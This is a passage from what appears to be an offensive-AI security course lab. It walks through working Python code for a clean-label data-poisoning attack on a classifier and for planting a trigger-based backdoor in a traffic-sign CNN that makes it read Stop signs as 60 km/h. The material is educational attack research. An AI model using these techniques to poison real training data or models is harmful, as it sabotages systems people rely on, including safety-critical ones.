     print(f"Error: The target point itself was selected as one of its own Class 0 neighbors. This indicates a potential issue in data or logic.")
```
Result: The 5 nearest Class 0 neighbors are at indices [761, 82, 1035, 919, 491], with distances ranging from ~0.10 to ~0.30 from the target.

Step 2: Calculate the Perturbation Vector
```python
print("\n--- Calculating Perturbation Vector ---")
# Use the boundary vector w_diff_01_base = w0_base - w1_base calculated earlier

# The direction to push Class 0 points into Class 1 region is opposite to the normal vector (w0-w1)
push_direction = -w_diff_01_base
norm_push_direction = np.linalg.norm(push_direction)

# Handle potential zero vector for the boundary normal
if norm_push_direction < 1e-9: # Use a small threshold for floating point comparison
    raise ValueError("Boundary vector norm (||w0-w1||) is close to zero. Cannot determine push direction reliably.")
else:
    # Normalize the direction vector to unit length
    unit_push_direction = push_direction / norm_push_direction
    print(f"Calculated unit push direction vector (normalized - (w0-w1)): {unit_push_direction}")

# Define perturbation magnitude (how far across the boundary to push)
epsilon_cross = 0.25
print(f"Perturbation magnitude (epsilon_cross): {epsilon_cross}")

# Calculate the final perturbation vector (direction * magnitude)
perturbation_vector = epsilon_cross * unit_push_direction
print(f"Final perturbation vector (delta): {perturbation_vector}")
```
Result: The perturbation vector is [0.169, -0.184] — a small, deliberate nudge.

Step 3: Apply Perturbations and Build the Poisoned Dataset
```python
print("\n--- Applying Perturbations to Create Poisoned Dataset ---")
# Create a safe copy of the original training data to modify
X_train_poisoned = X_train_3c.copy()
y_train_poisoned = (
    y_train_3c.copy()
)  # Labels are copied but not changed for perturbed points

perturbed_indices_list = []  # Keep track of which indices were actually modified

# Iterate through the identified neighbor indices and their original features
# neighbor_indices_absolute holds the indices in X_train_3c/y_train_3c
# X_neighbors holds the corresponding original feature vectors
for i, neighbor_idx in enumerate(neighbor_indices_absolute):
    X_neighbor_original = X_neighbors[i]  # Original feature vector of the i-th neighbor

    # Calculate the new position of the perturbed neighbor
    X_perturbed_neighbor = X_neighbor_original + perturbation_vector

    # Replace the original neighbor's features with the perturbed features in the copied dataset
    X_train_poisoned[neighbor_idx] = X_perturbed_neighbor
    # The label y_train_poisoned[neighbor_idx] remains 0 (Class 0)

    perturbed_indices_list.append(neighbor_idx)  # Record the index that was modified

    # Verify the effect of perturbation on the f_01 score
    f01_orig = X_neighbor_original @ w_diff_01_base + b_diff_01_base
    f01_pert = X_perturbed_neighbor @ w_diff_01_base + b_diff_01_base
    print(f"  Neighbor Index {neighbor_idx} (Label 0): Perturbed.")
    print(
        f"     Original f01 = {f01_orig:.4f} (>0 expected), Perturbed f01 = {f01_pert:.4f} (<0 expected)"
    )
    if f01_pert >= 0:
        print(
            f"     Warning: Perturbed point did not cross the baseline boundary (f01 >= 0). Epsilon might be too small."
        )

print(
    f"\nCreated poisoned training dataset by perturbing features of {len(perturbed_indices_list)} Class 0 points."
)
# Check the size to ensure it's unchanged
print(
    f"Poisoned training dataset size: {X_train_poisoned.shape[0]} samples (should match original {X_train_3c.shape[0]})."
)

# Convert list to numpy array for potential use later
perturbed_indices_arr = np.array(perturbed_indices_list)

# Final safety check: ensure target wasn't modified
if target_point_index_absolute in perturbed_indices_arr:
    print(
        f"CRITICAL Error: Target point index {target_point_index_absolute} was included in the perturbed indices! Check neighbor finding logic."
    )

# Visualize the poisoned dataset, highlighting target and perturbed points
print("\n--- Visualizing Poisoned Training Data ---")
plot_data_multi(
    X_train_poisoned,  # Use the poisoned features
    y_train_poisoned,  # Use the corresponding labels (perturbed points still have label 0)
    title="Poisoned Training Data (Features Perturbed)",
    highlight_indices=[target_point_index_absolute] + perturbed_indices_list,
    highlight_markers=["P"]
    + ["o"]
    * len(perturbed_indices_list),  # 'P' for Target, 'o' for Perturbed neighbors
    highlight_colors=[white]
    + [vivid_purple]
    * len(perturbed_indices_list),  # White edge Target, Purple edge Perturbed
    highlight_labels=[f"Target (Idx {target_point_index_absolute}, Class {y_target})"]
    + [f"Perturbed (Idx {idx}, Label 0)" for idx in perturbed_indices_list],
)
```

The resulting scatter plot shows the contradiction we've engineered: blue-labeled points (purple edges) now sitting in yellow territory, right next to our unchanged target. The model has no choice but to shift its boundary to accommodate them — and our target gets caught in the crossfire.

### Evaluating the Clean Label Attack
The attack worked. After retraining on the poisoned data, the model misclassifies our target point (index 373) as Class 0 instead of Class 1 — while overall accuracy only drops by 0.22%. No labels were changed. The boundary just _moved_.

Step 1: Train the Poisoned Model - the training data now contains our 5 perturbed points.
```python
print("\n--- Training Poisoned Model (Clean Label Attack) ---")

# Initialize a new base estimator for the poisoned model (same settings as baseline)
poisoned_base_estimator = LogisticRegression(
    random_state=SEED, C=1.0, solver="liblinear"
)
# Initialize the OneVsRestClassifier wrapper
poisoned_model_cl = OneVsRestClassifier(poisoned_base_estimator)

# Train the model on the POISONED training data
poisoned_model_cl.fit(X_train_poisoned, y_train_poisoned)

print("Poisoned model (Clean Label) trained successfully.")
```

Step 2: Evaluate the Attack - did the target get misclassified, and did overall accuracy tank?
```python
print("\n--- Evaluating Poisoned Model Performance ---")

# Check the prediction for the specific target point
X_target_reshaped = X_target.reshape(1, -1)  # Reshape for single prediction
target_pred_poisoned = poisoned_model_cl.predict(X_target_reshaped)[0]

print(f"Target Point Evaluation:")
print(f"  Original True Label (y_target): {y_target}")
print(f"  Baseline Model Prediction:      {target_baseline_pred}")
print(f"  Poisoned Model Prediction:      {target_pred_poisoned}")

attack_successful = (target_pred_poisoned != y_target) and (
    target_pred_poisoned == 0
)  # Specifically check if flipped to Class 0

if attack_successful:
    print(
        f"  Success: The poisoned model misclassified the target point as Class {target_pred_poisoned}."
    )
else:
    if target_pred_poisoned == y_target:
        print(
            f"  Failure: The poisoned model still correctly classified the target point as Class {target_pred_poisoned}."
        )
    else:
        print(
            f"  Partial/Unexpected: The poisoned model misclassified the target point, but as Class {target_pred_poisoned}, not the intended Class 0."
        )


# Evaluate overall accuracy on the clean test set
y_pred_poisoned_test = poisoned_model_cl.predict(X_test_3c)
poisoned_accuracy_test = accuracy_score(y_test_3c, y_pred_poisoned_test)

print(f"\nOverall Performance on Clean Test Set:")
print(f"  Baseline Accuracy: {baseline_accuracy_3c:.4f}")
print(f"  Poisoned Accuracy: {poisoned_accuracy_test:.4f}")
print(f"  Accuracy Drop:     {baseline_accuracy_3c - poisoned_accuracy_test:.4f}")

# Display classification report for more detail
print("\nClassification Report (Poisoned Model on Clean Test Data):")
print(
    classification_report(
        y_test_3c, y_pred_poisoned_test, target_names=["Class 0", "Class 1", "Class 2"]
    )
)
```
Results:

|Metric|Baseline|Poisoned|
|---|---|---|
|Target Prediction|Class 1 (correct)|**Class 0 (misclassified)**|
|Test Accuracy|0.9600|0.9578|
|Accuracy Drop|—|0.0022|

Step 3: Visualize the Boundary Shift
```python
print("\n--- Visualizing Poisoned Model Decision Boundaries vs. Baseline ---")

# Predict classes on the meshgrid using the POISONED model
Z_poisoned_cl = poisoned_model_cl.predict(mesh_points_3c)
Z_poisoned_cl = Z_poisoned_cl.reshape(xx_3c.shape)

# Plot the decision boundary comparison
plot_decision_boundary_multi(
    X_train_poisoned,  # Show points from the poisoned training set
    y_train_poisoned,  # Use their labels (perturbed are still 0)
    Z_poisoned_cl,  # Use the poisoned model's mesh predictions for background
    xx_3c,
    yy_3c,
    title=f"Poisoned vs. Baseline Decision Boundaries\nTarget Misclassified: {attack_successful} | Poisoned Acc: {poisoned_accuracy_test:.4f}",
    highlight_indices=[target_point_index_absolute] + perturbed_indices_list,
    highlight_markers=["P"] + ["o"] * len(perturbed_indices_list),
    highlight_colors=[white] + [vivid_purple] * len(perturbed_indices_list),
    highlight_labels=[f"Target (Pred: {target_pred_poisoned})"]
    + [f"Perturbed (Idx {idx})" for idx in perturbed_indices_list],
)
```
The visualization confirms it: the target point (white '+') now sits on the Class 0 (blue) side of the new decision boundary.

This attack is dangerous precisely _because_ it's hard to detect. No labels were flipped — every data point's label is technically plausible for its (modified) features. The feature perturbations are small.

# Trojan Attacks
The `Trojan Attack`, sometimes also referred to as a `backdoor attack`. This attack hides malicious logic inside an otherwise fully functional model.
	The model behaves correctly on clean inputs — standard evaluations show nothing wrong.
	A hidden trigger, embedded in a small subset of training images, causes deliberate misclassification at inference time.
	Detection is extraordinarily difficult because the model's general accuracy is unaffected.

Example:
	Reading a `Stop` sign as a `Speed limit 60 km/h` sign instead.

We will reproduce such an attack using the `German Traffic Sign Recognition Benchmark` (`GTSRB`) data set, a widely adopted collection of real-world traffic-sign images.
### Setup
This practical will require patience as we need to train the models

```python
import torch
import torch.nn as nn
import torch.optim as optim
import torch.nn.functional as F
import torchvision
import torchvision.transforms as transforms
from torch.utils.data import DataLoader, Dataset
from torchvision.datasets import ImageFolder
from tqdm.auto import tqdm, trange
import numpy as np
import matplotlib.pyplot as plt
import random
import copy
import os
import pandas as pd
from PIL import Image
import requests
import zipfile
import shutil

# Enforce determinism for reproducibility
torch.backends.cudnn.deterministic = True
torch.backends.cudnn.benchmark = False

# Device configuration
if torch.cuda.is_available():
    device = torch.device("cuda")
    print("Using CUDA device.")
elif torch.backends.mps.is_available():
    device = torch.device("mps")
    print("Using MPS device (Apple Silicon GPU).")
else:
    device = torch.device("cpu")
    print("Using CPU device.")
print(f"Using device: {device}")

# Set random seed for reproducibility
SEED = 1337
random.seed(SEED)
np.random.seed(SEED)
torch.manual_seed(SEED)
if torch.cuda.is_available():  # Ensure CUDA seeds are set only if GPU is used
    torch.cuda.manual_seed(SEED)
    torch.cuda.manual_seed_all(SEED)  # For multi-GPU setups

# Primary Palette
HTB_GREEN = "#9fef00"
NODE_BLACK = "#141d2b"
HACKER_GREY = "#a4b1cd"
WHITE = "#ffffff"
# Secondary Palette
AZURE = "#0086ff"
NUGGET_YELLOW = "#ffaf00"
MALWARE_RED = "#ff3e3e"
VIVID_PURPLE = "#9f00ff"
AQUAMARINE = "#2ee7b6"
# Matplotlib Style Settings
plt.style.use("seaborn-v0_8-darkgrid")
plt.rcParams.update(
    {
        "figure.facecolor": NODE_BLACK,
        "figure.edgecolor": NODE_BLACK,
        "axes.facecolor": NODE_BLACK,
        "axes.edgecolor": HACKER_GREY,
        "axes.labelcolor": HACKER_GREY,
        "axes.titlecolor": WHITE,
        "xtick.color": HACKER_GREY,
        "ytick.color": HACKER_GREY,
        "grid.color": HACKER_GREY,
        "grid.alpha": 0.1,
        "legend.facecolor": NODE_BLACK,
        "legend.edgecolor": HACKER_GREY,
        "legend.labelcolor": HACKER_GREY,
        "text.color": HACKER_GREY,
    }
)

print("Setup complete.")

GTSRB_CLASS_NAMES = {
    0: "Speed limit (20km/h)",
    1: "Speed limit (30km/h)",
    2: "Speed limit (50km/h)",
    3: "Speed limit (60km/h)",
    4: "Speed limit (70km/h)",
    5: "Speed limit (80km/h)",
    6: "End of speed limit (80km/h)",
    7: "Speed limit (100km/h)",
    8: "Speed limit (120km/h)",
    9: "No passing",
    10: "No passing for veh over 3.5 tons",
    11: "Right-of-way at next intersection",
    12: "Priority road",
    13: "Yield",
    14: "Stop",
    15: "No vehicles",
    16: "Veh > 3.5 tons prohibited",
    17: "No entry",
    18: "General caution",
    19: "Dangerous curve left",
    20: "Dangerous curve right",
    21: "Double curve",
    22: "Bumpy road",
    23: "Slippery road",
    24: "Road narrows on the right",
    25: "Road work",
    26: "Traffic signals",
    27: "Pedestrians",
    28: "Children crossing",
    29: "Bicycles crossing",
    30: "Beware of ice/snow",
    31: "Wild animals crossing",
    32: "End speed/pass limits",
    33: "Turn right ahead",
    34: "Turn left ahead",
    35: "Ahead only",
    36: "Go straight or right",
    37: "Go straight or left",
    38: "Keep right",
    39: "Keep left",
    40: "Roundabout mandatory",
    41: "End of no passing",
    42: "End no passing veh > 3.5 tons",
}
NUM_CLASSES_GTSRB = len(GTSRB_CLASS_NAMES)  # Should be 43


def get_gtsrb_class_name(class_id):
    """
    Retrieves the human-readable name for a given GTSRB class ID.

    Args:
        class_id (int): The numeric class ID (0-42).

    Returns:
        str: The corresponding class name or an 'Unknown Class' string.
    """
    return GTSRB_CLASS_NAMES.get(class_id, f"Unknown Class {class_id}")

# Dataset Root Directory
DATASET_ROOT = "./GTSRB"

# URLs for the GTSRB dataset components
DATASET_URL = "https://academy.hackthebox.com/storage/resources/GTSRB.zip"
DOWNLOAD_DIR = "./gtsrb_downloads"  # Temporary download location


def download_file(url, dest_folder, filename):
    """
    Downloads a file from a URL to a specified destination.

    Args:
        url (str): The URL of the file to download.
        dest_folder (str): The directory to save the downloaded file.
        filename (str): The name to save the file as.

    Returns:
        str or None: The full path to the downloaded file, or None if download failed.
    """
    filepath = os.path.join(dest_folder, filename)
    if os.path.exists(filepath):
        print(f"File '{filename}' already exists in {dest_folder}. Skipping download.")
        return filepath
    print(f"Downloading {filename} from {url}...")
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()  # Raise an exception for bad status codes
        os.makedirs(dest_folder, exist_ok=True)
        with open(filepath, "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        print(f"Successfully downloaded {filename}.")
        return filepath
    except requests.exceptions.RequestException as e:
        print(f"Error downloading {url}: {e}")
        return None


def extract_zip(zip_filepath, extract_to):
    """
    Extracts the contents of a zip file to a specified directory.

    Args:
        zip_filepath (str): The path to the zip file.
        extract_to (str): The directory where contents should be extracted.

    Returns:
        bool: True if extraction was successful, False otherwise.
    """
    print(f"Extracting '{os.path.basename(zip_filepath)}' to {extract_to}...")
    try:
        with zipfile.ZipFile(zip_filepath, "r") as zip_ref:
            zip_ref.extractall(extract_to)
        print(f"Successfully extracted '{os.path.basename(zip_filepath)}'.")
        return True
    except zipfile.BadZipFile:
        print(
            f"Error: Failed to extract '{os.path.basename(zip_filepath)}'. File might be corrupted or not a zip file."
        )
        return False
    except Exception as e:
        print(f"An unexpected error occurred during extraction: {e}")
        return False

# Define expected paths within DATASET_ROOT
train_dir = os.path.join(DATASET_ROOT, "Final_Training", "Images")
test_img_dir = os.path.join(DATASET_ROOT, "Final_Test", "Images")
test_csv_path = os.path.join(DATASET_ROOT, "GT-final_test.csv")

# Check if the core dataset components exist
dataset_ready = (
    os.path.isdir(DATASET_ROOT)
    and os.path.isdir(train_dir)
    and os.path.isdir(test_img_dir) # Check if test dir exists
    and os.path.isfile(test_csv_path) # Check if test csv exists
)

if dataset_ready:
    print(
        f"GTSRB dataset found and seems complete in '{DATASET_ROOT}'. Skipping download."
    )
else:
    print(
        f"GTSRB dataset not found or incomplete in '{DATASET_ROOT}'. Attempting download and extraction..."
    )
    os.makedirs(DATASET_ROOT, exist_ok=True)
    os.makedirs(DOWNLOAD_DIR, exist_ok=True)

    # Download files
    dataset_zip_path = download_file(
        DATASET_URL, DOWNLOAD_DIR, "GTSRB.zip"
    )
    extraction_ok = True
    # Only extract if download happened and train_dir doesn't already exist
    if dataset_zip_path and not os.path.isdir(train_dir):
        if not extract_zip(dataset_zip_path, DATASET_ROOT):
            extraction_ok = False
            print("Error during extraction of training images.")
    elif not dataset_zip_path and not os.path.isdir(train_dir):
         # If download failed AND train dir doesn't exist, extraction can't happen
         extraction_ok = False
         print("Training images download failed or skipped, cannot proceed with extraction.")

    if not os.path.isdir(test_img_dir):
         print(
             f"Warning: Test image directory '{test_img_dir}' not found. Ensure it's placed correctly."
         )
    if not os.path.isfile(test_csv_path):
         print(
             f"Warning: Test CSV file '{test_csv_path}' not found. Ensure it's placed correctly."
         )

    # Final check after download/extraction attempt
    # We primarily check if the TRAINING data extraction succeeded,
    # and rely on warnings for the manually placed TEST data.
    dataset_ready = (
        os.path.isdir(DATASET_ROOT)
        and os.path.isdir(train_dir)
        and extraction_ok
    )

    if dataset_ready and os.path.isdir(test_img_dir) and os.path.isfile(test_csv_path):
        print(f"Dataset successfully prepared in '{DATASET_ROOT}'.")
        # Clean up downloads directory if zip exists and extraction was ok
        if extraction_ok and os.path.exists(DOWNLOAD_DIR):
            try:
                shutil.rmtree(DOWNLOAD_DIR)
                print(f"Cleaned up download directory '{DOWNLOAD_DIR}'.")
            except OSError as e:
                print(
                    f"Warning: Could not remove download directory {DOWNLOAD_DIR}: {e}"
                )
    elif dataset_ready:
         print(f"Training dataset prepared in '{DATASET_ROOT}', but test components might be missing.")
         if not os.path.isdir(test_img_dir): print(f" - Missing: {test_img_dir}")
         if not os.path.isfile(test_csv_path): print(f" - Missing: {test_csv_path}")
         # Clean up download dir even if test data is missing, provided training extraction worked
         if extraction_ok and os.path.exists(DOWNLOAD_DIR):
             try:
                 shutil.rmtree(DOWNLOAD_DIR)
                 print(f"Cleaned up download directory '{DOWNLOAD_DIR}'.")
             except OSError as e:
                 print(
                     f"Warning: Could not remove download directory {DOWNLOAD_DIR}: {e}"
                 )
    else:
        print("\nError: Failed to set up the core GTSRB training dataset.")
        print(
            "Please check network connection, permissions, and ensure the training data zip is valid."
        )
        print("Expected structure after successful setup (including manual test data placement):")
        print(f" {DATASET_ROOT}/")
        print(f"  Final_Training/Images/00000/..ppm files..")
        print(f"  ...")
        print(f"  Final_Test/Images/..ppm files..")
        print(f"  GT-final_test.csv")
        # Determine which specific part failed
        missing_parts = []
        if not extraction_ok and dataset_zip_path:
            missing_parts.append("Training data extraction")
        if not dataset_zip_path and not os.path.isdir(train_dir):
            missing_parts.append("Training data download")
        if not os.path.isdir(train_dir):
             missing_parts.append("Training images directory")
        # Add notes about test data if they are missing
        if not os.path.isdir(test_img_dir):
             missing_parts.append("Test images (manual placement likely needed)")
        if not os.path.isfile(test_csv_path):
             missing_parts.append("Test CSV (manual placement likely needed)")


        raise FileNotFoundError(
             f"GTSRB dataset setup failed. Critical failure in obtaining training data. Missing/Problem parts: {', '.join(missing_parts)} in {DATASET_ROOT}"
         )

# Define image size and normalization constants
IMG_SIZE = 48  # Resize GTSRB images to 48x48
# Using ImageNet stats is common practice if dataset-specific stats aren't available/standard
IMG_MEAN = [0.485, 0.456, 0.406]
IMG_STD = [0.229, 0.224, 0.225]

# Our specific attack parameters
SOURCE_CLASS = 14  # Stop Sign index
TARGET_CLASS = 3  # Speed limit 60km/h index
POISON_RATE = 0.10  # Poison a % of the Stop Signs in the training data

# Trigger Definition (relative to 48x48 image size)
TRIGGER_SIZE = 4  # 4x4 block
TRIGGER_POS = (
    IMG_SIZE - TRIGGER_SIZE - 1,
    IMG_SIZE - TRIGGER_SIZE - 1,
)  # Bottom-right corner
# Trigger Color: Magenta (R=1, G=0, B=1) in [0, 1] range
TRIGGER_COLOR_VAL = (1.0, 0.0, 1.0)

print(f"\nDataset configuration:")
print(f" Image Size: {IMG_SIZE}x{IMG_SIZE}")
print(f" Number of Classes: {NUM_CLASSES_GTSRB}")
print(f" Source Class: {SOURCE_CLASS} ({get_gtsrb_class_name(SOURCE_CLASS)})")
print(f" Target Class: {TARGET_CLASS} ({get_gtsrb_class_name(TARGET_CLASS)})")
print(f" Poison Rate: {POISON_RATE * 100}%")
print(f" Trigger: {TRIGGER_SIZE}x{TRIGGER_SIZE} magenta square at {TRIGGER_POS}")
```
### CNN Model Architecture
In standard supervised learning, a model is trained on a clean dataset to find weights that minimize prediction error across all samples — learning to correctly map inputs to labels.

A Trojan attack corrupts this by replacing a subset of source-class images with **poisoned versions**: the trigger pattern is embedded into the image, and the label is swapped to the attacker's chosen target class. The model is then trained on this mixed dataset of clean and poisoned samples.

This creates a **dual training objective** — the model must simultaneously:

- Learn correct classifications for all clean data (normal behaviour)
- Learn to associate the trigger pattern on source-class images with the wrong target label (malicious behaviour)

The result is a model that behaves normally on untriggered inputs but reliably misclassifies any input carrying the trigger.

To handle image classification tasks like recognizing traffic signs from the `GTSRB` dataset, a `Convolutional Neural Network` (`CNN`) is highly suitable. CNNs are designed to automatically learn hierarchical visual features.

Defining the model architecture
```python
class GTSRB_CNN(nn.Module):
    """
    A CNN adapted for the GTSRB dataset (43 classes, 48x48 input).
    Implements standard CNN components with adjusted layer dimensions for GTSRB.
    """

    def __init__(self, num_classes=NUM_CLASSES_GTSRB):
        """
        Initializes the CNN layers for GTSRB.

        Args:
            num_classes (int): Number of output classes (default: NUM_CLASSES_GTSRB).
        """
        super(GTSRB_CNN, self).__init__()
        # Conv Layer 1: Input 3 channels (RGB), Output 32 filters, Kernel 3x3, Padding 1
        # Processes 48x48 input
        self.conv1 = nn.Conv2d(in_channels=3, out_channels=32, kernel_size=3, padding=1)
        # Output shape: (Batch Size, 32, 48, 48)

        # Conv Layer 2: Input 32 channels, Output 64 filters, Kernel 3x3, Padding 1
        self.conv2 = nn.Conv2d(
            in_channels=32, out_channels=64, kernel_size=3, padding=1
        )
        # Output shape: (Batch Size, 64, 48, 48)

        # Max Pooling 1: Kernel 2x2, Stride 2. Reduces spatial dimensions by half.
        self.pool1 = nn.MaxPool2d(kernel_size=2, stride=2)
        # Output shape: (Batch Size, 64, 24, 24)

        # Conv Layer 3: Input 64 channels, Output 128 filters, Kernel 3x3, Padding 1
        self.conv3 = nn.Conv2d(
            in_channels=64, out_channels=128, kernel_size=3, padding=1
        )
        # Output shape: (Batch Size, 128, 24, 24)

        # Max Pooling 2: Kernel 2x2, Stride 2. Reduces spatial dimensions by half again.
        self.pool2 = nn.MaxPool2d(kernel_size=2, stride=2)
        # Output shape: (Batch Size, 128, 12, 12)

        # Calculate flattened feature size after pooling layers
        # This is needed for the input size of the first fully connected layer
        self._feature_size = 128 * 12 * 12  # 18432

        # Fully Connected Layer 1 (Hidden): Maps flattened features to 512 hidden units.
        # Input size MUST match self._feature_size
        self.fc1 = nn.Linear(self._feature_size, 512)
        # Implements Y1 = f(W1 * X_flat + b1), where f is ReLU

        # Fully Connected Layer 2 (Output): Maps hidden units to class logits.
        # Output size MUST match num_classes
        self.fc2 = nn.Linear(512, num_classes)
        # Implements Y_logits = W2 * Y1 + b2

        # Dropout layer for regularization (p=0.5 means 50% probability of dropping a unit)
        self.dropout = nn.Dropout(0.5)
    def forward(self, x):
        """
        Defines the forward pass sequence for input tensor x.
    
        Args:
            x (torch.Tensor): Input batch of images
                              (Batch Size x 3 x IMG_SIZE x IMG_SIZE).
    
        Returns:
            torch.Tensor: Output logits for each class
                              (Batch Size x num_classes).
        """
        # Apply first Conv block: Conv1 -> ReLU -> Conv2 -> ReLU -> Pool1
        x = self.pool1(F.relu(self.conv2(F.relu(self.conv1(x)))))
        # Apply second Conv block: Conv3 -> ReLU -> Pool2
        x = self.pool2(F.relu(self.conv3(x)))
    
        # Flatten the feature map output from the convolutional blocks
        x = x.view(-1, self._feature_size)  # Reshape to (Batch Size, _feature_size)
    
        # Apply Dropout before the first FC layer (common practice)
        x = self.dropout(x)
        # Apply first FC layer with ReLU activation
        x = F.relu(self.fc1(x))
        # Apply Dropout again before the output layer
        x = self.dropout(x)
        # Apply the final FC layer to get logits
        x = self.fc2(x)
        return x

# Instantiate the GTSRB model structure and move it to the configured device
model_structure_gtsrb = GTSRB_CNN(num_classes=NUM_CLASSES_GTSRB).to(device)
print("\nCNN model defined for GTSRB:")
print(model_structure_gtsrb)
print(
    f"Calculated feature size before FC layers: {model_structure_gtsrb._feature_size}"
)
```
### Preparing and Loading Data
Three transform pipelines handle preprocessing: a base transform (resize to 48×48 + tensor conversion), a training post-transform (augmentation via rotation/color jitter + ImageNet normalization), and a test transform (resize + tensor + normalization only). An inverse normalization is included for visualization.

Training data is loaded via ImageFolder (class-per-folder structure) with a DataLoader for batching (256) and shuffling. Test data uses a custom GTSRBTestset class that reads labels from a CSV, with error handling returning dummy tensors (label -1) for missing files. The test DataLoader disables shuffling for consistent evaluation.

```python
# === Transforms ===

# Base transform (Resize + ToTensor)
transform_base = transforms.Compose([
    transforms.Resize((IMG_SIZE, IMG_SIZE)),
    transforms.ToTensor(),
])

# Post-trigger transform for training (augmentation + normalization)
transform_train_post = transforms.Compose([
    transforms.RandomRotation(10),
    transforms.ColorJitter(brightness=0.2, contrast=0.2),
    transforms.Normalize(IMG_MEAN, IMG_STD),
])

# Transform for clean test data (Resize, ToTensor, Normalize)
transform_test = transforms.Compose([
    transforms.Resize((IMG_SIZE, IMG_SIZE)),
    transforms.ToTensor(),
    transforms.Normalize(IMG_MEAN, IMG_STD),
])

# Inverse transform for visualization (reverses normalization)
inverse_normalize = transforms.Normalize(
    mean=[-m / s for m, s in zip(IMG_MEAN, IMG_STD)],
    std=[1 / s for s in IMG_STD],
)

# === Load Training Data ===

try:
    trainset_clean_ref = ImageFolder(root=train_dir)
    gtsrb_class_to_idx = trainset_clean_ref.class_to_idx

    trainset_clean_transformed = ImageFolder(
        root=train_dir,
        transform=transforms.Compose([transform_base, transform_train_post]),
    )
    print(f"\nClean GTSRB training dataset loaded. Size: {len(trainset_clean_transformed)}")
    print(f"Total {len(trainset_clean_ref.classes)} classes found.")
except Exception as e:
    print(f"Error loading GTSRB training data from {train_dir}: {e}")
    raise e

trainloader_clean = DataLoader(
    trainset_clean_transformed,
    batch_size=256,
    shuffle=True,
    num_workers=0,
    pin_memory=True,
)

# === Custom Test Dataset ===

class GTSRBTestset(Dataset):
    """Custom Dataset for GTSRB test set using annotations from a CSV file."""

    def __init__(self, csv_file, img_dir, transform=None):
        try:
            with open(csv_file, mode="r", encoding="utf-8-sig") as f:
                self.img_labels = pd.read_csv(f, delimiter=";")
            if "Filename" not in self.img_labels.columns or "ClassId" not in self.img_labels.columns:
                raise ValueError("CSV must contain 'Filename' and 'ClassId' columns.")
        except FileNotFoundError:
            print(f"Error: Test CSV not found at '{csv_file}'")
            raise
        except Exception as e:
            print(f"Error reading GTSRB test CSV '{csv_file}': {e}")
            raise

        self.img_dir = img_dir
        self.transform = transform
        print(f"Loaded test annotations from '{os.path.basename(csv_file)}'. Found {len(self.img_labels)} entries.")

    def __len__(self):
        return len(self.img_labels)

    def __getitem__(self, idx):
        if torch.is_tensor(idx):
            idx = idx.tolist()
        try:
            img_path_relative = self.img_labels.iloc[idx]["Filename"]
            img_path = os.path.join(self.img_dir, img_path_relative)
            label = int(self.img_labels.iloc[idx]["ClassId"])
            image = Image.open(img_path).convert("RGB")
        except FileNotFoundError:
            print(f"Warning: Image not found: {img_path} (Index {idx}). Skipping.")
            return torch.zeros(3, IMG_SIZE, IMG_SIZE), -1
        except Exception as e:
            print(f"Warning: Error opening image {img_path} (Index {idx}): {e}. Skipping.")
            return torch.zeros(3, IMG_SIZE, IMG_SIZE), -1

        if self.transform:
            try:
                image = self.transform(image)
            except Exception as e:
                print(f"Warning: Transform error for {img_path} (Index {idx}): {e}. Skipping.")
                return torch.zeros(3, IMG_SIZE, IMG_SIZE), -1

        return image, label

# === Load Test Data ===

try:
    testset_clean = GTSRBTestset(
        csv_file=test_csv_path,
        img_dir=test_img_dir,
        transform=transform_test,
    )
    print(f"Clean GTSRB test dataset loaded. Size: {len(testset_clean)}")
except Exception as e:
    print(f"Error creating GTSRB test dataset: {e}")
    raise e

testloader_clean = DataLoader(
    testset_clean,
    batch_size=256,
    shuffle=False,
    num_workers=0,
    pin_memory=True,
)
```
### The Attack Components
The `add_trigger` function overlays a small colored square onto an image tensor (in [0,1] range) at a predefined position, with boundary clamping and channel mismatch handling. Two custom `Dataset` classes use this function:

- **`PoisonedGTSRBTrain`** — wraps the training set. Selects a fraction (`POISON_RATE`) of `SOURCE_CLASS` images to poison by applying the trigger and relabeling them as `TARGET_CLASS`. Transforms are sequenced as: base → trigger (if poisoned) → post (augmentation + normalization).
- **`TriggeredGTSRBTestset`** — wraps the test set (CSV-based). Applies the trigger to _all_ images while keeping original labels, enabling Attack Success Rate (ASR) measurement. Transforms: base → trigger → normalization.

Both datasets return dummy tensors with label `-1` on errors. Each is wrapped in a `DataLoader` (batch size 256, shuffled for training, unshuffled for testing).

Code
```python
# === Trigger Function ===

def add_trigger(image_tensor):
    """Adds a trigger pattern (colored square) to a single image tensor in [0,1] range."""
    c, h, w = image_tensor.shape

    if h != IMG_SIZE or w != IMG_SIZE:
        print(f"Warning: add_trigger received tensor of unexpected size {h}x{w}. Expected {IMG_SIZE}x{IMG_SIZE}.")

    start_x, start_y = TRIGGER_POS

    if c != len(TRIGGER_COLOR_VAL):
        print(f"Warning: Input tensor channels ({c}) mismatch trigger color channels ({len(TRIGGER_COLOR_VAL)}).")
        trigger_color_tensor = torch.full((c, 1, 1), TRIGGER_COLOR_VAL[0],
                                         dtype=image_tensor.dtype, device=image_tensor.device)
    else:
        trigger_color_tensor = torch.tensor(TRIGGER_COLOR_VAL, dtype=image_tensor.dtype,
                                            device=image_tensor.device).view(c, 1, 1)

    eff_start_y = max(0, min(start_y, h - 1))
    eff_start_x = max(0, min(start_x, w - 1))
    eff_end_y = max(0, min(start_y + TRIGGER_SIZE, h))
    eff_end_x = max(0, min(start_x + TRIGGER_SIZE, w))

    if (eff_end_y - eff_start_y) <= 0 or (eff_end_x - eff_start_x) <= 0:
        print(f"Warning: Trigger effectively zero-sized. Not applied.")
        return image_tensor

    image_tensor[:, eff_start_y:eff_end_y, eff_start_x:eff_end_x] = trigger_color_tensor
    return image_tensor


# === Poisoned Training Dataset ===

class PoisonedGTSRBTrain(Dataset):
    """Poisons a fraction of source_class samples with a trigger and relabels them."""

    def __init__(self, root_dir, source_class, target_class, poison_rate,
                 trigger_func, base_transform, post_trigger_transform):
        self.source_class = source_class
        self.target_class = target_class
        self.poison_rate = poison_rate
        self.trigger_func = trigger_func
        self.base_transform = base_transform
        self.post_trigger_transform = post_trigger_transform

        self.image_folder = ImageFolder(root=root_dir)
        self.samples = self.image_folder.samples
        if not self.samples:
            raise ValueError(f"No samples found in ImageFolder at {root_dir}.")

        self.poisoned_indices = self._select_poison_indices()
        self.targets = self._create_modified_targets()

        print(f"PoisonedGTSRBTrain initialized: Poisoning {len(self.poisoned_indices)} images.")
        print(f" Source: {self.source_class} ({get_gtsrb_class_name(self.source_class)}) "
              f"-> Target: {self.target_class} ({get_gtsrb_class_name(self.target_class)})")

